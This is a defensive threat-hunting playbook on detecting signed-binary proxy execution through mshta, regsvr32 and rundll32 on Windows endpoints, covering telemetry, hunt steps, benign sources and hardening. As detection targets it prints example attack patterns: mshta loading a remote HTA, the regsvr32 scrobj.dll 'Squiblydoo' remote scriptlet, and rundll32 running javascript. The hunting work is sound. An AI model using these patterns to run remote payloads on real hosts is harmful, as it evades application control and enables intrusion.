# Playbook HL-0008 — LOLBin Proxy Execution (mshta / regsvr32 / rundll32)

| Field | Value |
|---|---|
| Hypothesis ID | HL-0008 |
| ATT&CK | **T1218** System Binary Proxy Execution · **T1218.005** Mshta · **T1218.010** Regsvr32 · **T1218.011** Rundll32 |
| Tactic(s) | Stealth |
| Platforms | Windows endpoints and servers |
| Difficulty | Beginner |
| Queries | [Sigma](../queries/sigma/hl-0008_lolbin_proxy_execution.yml) · [KQL](../queries/kql/hl-0008_lolbin_proxy_execution.kql) · [SPL](../queries/spl/hl-0008_lolbin_proxy_execution.spl) |

---

## 1. Intelligence basis

Loaders and initial-access operators routinely run their first-stage code through Microsoft-signed binaries so that application control, reputation checks and casual review see a trusted process name. The three most abused proxies share one pattern: **a signed binary handed remote or inline script content on the command line.**

- `mshta.exe` executing an HTA from a URL (`mshta https://host/invoice.hta`) or inline `javascript:` / `vbscript:` — a staple of phishing links and LNK droppers.
- `regsvr32.exe` with `/i:http...` and `scrobj.dll` ("Squiblydoo") to pull and run a COM scriptlet (`.sct`) without writing a DLL to disk.
- `rundll32.exe` invoking `javascript:` / `RunHTMLApplication` through `mshtml`, or a URL, to run script from inside a DLL host.

These binaries almost never need to reach the internet in normal operation. A URL or script protocol in their command line is a high-signal lead. Map this to your PIRs by citing the specific loader family or advisory in your hypothesis card.

## 2. Hypothesis

> If an adversary is using signed-binary proxy execution to run payloads in our Windows estate, we expect `mshta.exe`, `regsvr32.exe` or `rundll32.exe` process-creation events whose command lines contain **remote URLs, script protocols (`javascript:` / `vbscript:`), `scrobj.dll` or `RunHTMLApplication`**, often with **Office, Outlook, browser or script-host parents**, and frequently followed by an **outbound connection from the LOLBin itself**, during the last 14–30 days.

**Refuted if:** process-creation telemetry (with command lines and OriginalFileName) covers ≥ 90% of in-scope hosts for the window and every hit is attributed to a documented legacy application or installer.

## 3. Data sources

| Source | Event / table | Key fields |
|---|---|---|
| Sysmon | Event ID 1 (Process Create) | `Image`, `OriginalFileName`, `CommandLine`, `ParentImage`, `User` |
| Sysmon | Event ID 3 (Network Connection) | `Image`, `DestinationIp`, `DestinationHostname`, `DestinationPort` |
| Windows Security | Event ID 4688 (command-line auditing required) | `NewProcessName`, `CommandLine`, `ParentProcessName` |
| Microsoft Defender XDR | `DeviceProcessEvents`, `DeviceNetworkEvents` | `FileName`, `ProcessVersionInfoOriginalFileName`, `ProcessCommandLine`, `RemoteIP`, `RemoteUrl` |
| Web proxy / DNS | Proxy logs | URL, user agent, verdict (allowed / blocked) |

**Pre-check:** confirm command lines are captured. 4688 has no OriginalFileName, so a **renamed** copy of `mshta.exe` will only be caught by Sysmon or Defender XDR. If you only have 4688 without command lines, log the outcome as **Inconclusive (data gap)**.

## 4. Hunt steps

1. **Run the query** for your platform across the hunt window. The KQL and SPL match on file name *or* OriginalFileName, so renamed copies are included.
2. **Stack by LOLBin, parent and remote host.** Sort ascending — a single `regsvr32` with a PowerShell parent, or `mshta` spawned by `OUTLOOK.EXE`, outranks anything seen on dozens of hosts.
3. **Extract the URL** (the queries do this) and check the domain or IP against threat intel, proxy categorization and first-seen date in your environment. Bare IP addresses in a LOLBin command line are rarely legitimate.
4. **Pivot to the network** — run the second KQL query (or the Sysmon 3 search) to see whether the LOLBin itself made an outbound connection, and to where. A hit with **no connection and a proxy block** is an attempt; a hit **with** a connection is a likely execution.
5. **Pivot forward in time** on each confirmed connection:
   - Child processes of the LOLBin (PowerShell, `cmd.exe`, another LOLBin) — chains are common.
   - Files written to `%TEMP%`, `%APPDATA%`, `C:\ProgramData` within minutes.
   - Persistence created shortly afterwards (Run keys — HL-0004; scheduled tasks — HL-0003).
6. **Pivot backward** to the delivery vector: the email, browser download or LNK file that launched the parent.
7. **Classify** each cluster as malicious, suspicious or benign and record it in the hunt report.

## 5. Known benign sources (tune, don't ignore)

| Source | How to recognize |
|---|---|
| Legacy line-of-business HTA apps | `mshta` with a **local or intranet** path, launched by `explorer.exe`, same command line across a department |
| Control Panel and printer applets via rundll32 | `shell32.dll,Control_RunDLL`, `printui.dll,PrintUIEntry` — no URL, no script protocol (should not match the query) |
| Installers registering COM servers | `regsvr32 /s` on a local DLL from `Program Files`, signed parent installer, no `/i:` URL |
| Intranet portals using HTA launchers | URL points at an internal FQDN you can attribute to an owner |

Scope exclusions to the exact command line and parent of the documented application — never exclude `mshta.exe` or `regsvr32.exe` wholesale.

## 6. Triage questions

- Does the command line point at an **external** URL or a raw IP? Who owns that destination and when was it first seen here?
- Is the parent expected to launch this binary? Office, Outlook, browsers, `wscript`/`cscript` and PowerShell are red flags.
- Did the LOLBin make its own outbound connection? Did the proxy allow or block it?
- What happened next on the host: child processes, file writes, persistence, credential access?
- Is the same command line on one host (targeted) or many (campaign or legitimate tooling)?
- Is the image path `System32`/`SysWOW64`? A copy elsewhere, or a mismatched OriginalFileName, means renaming.

## 7. Operationalize

- Promote the Sigma rule to production at `high`; volume should be very low after scoped exclusions.
- Block outbound internet for `mshta.exe`, `regsvr32.exe` and `rundll32.exe` at the proxy or host firewall — they have little legitimate need for it.
- Apply ASR rules / WDAC to block `mshta.exe` where no HTA applications exist, and change the `.hta` file association to Notepad on user workstations.
- Feed confirmed URLs and IPs back to CTI as indicators, and the parent-child chain as a behavioral detection.
- Record outcome, detections created and data gaps in `templates/hunt-report.md` and `templates/intel-feedback.md`.

## Lab notes

The lab dataset (`data/lab`) contains process creation (Sysmon and `DeviceProcessEvents`) and network telemetry (Sysmon 3 and `DeviceNetworkEvents`) for this hunt.

- Expect a **small** number of hits — this hunt is about reading each one carefully, not stacking thousands.
- The estate has legitimate `mshta` and `rundll32` usage. Confirm it does **not** match, and be able to explain why (what is missing from those command lines?).
- Not every hit has the same outcome. Use the network pivot to decide which attempt actually reached its destination and which went nowhere.
- At least one hit is the start of a longer chain. Follow its children and you will land in other hunts in this kit.

## References

- MITRE ATT&CK T1218 — https://attack.mitre.org/techniques/T1218/
- MITRE ATT&CK T1218.005 — https://attack.mitre.org/techniques/T1218/005/
- MITRE ATT&CK T1218.010 — https://attack.mitre.org/techniques/T1218/010/
- MITRE ATT&CK T1218.011 — https://attack.mitre.org/techniques/T1218/011/
- LOLBAS Project — https://lolbas-project.github.io/
- SigmaHQ rule repository — https://github.com/SigmaHQ/sigma
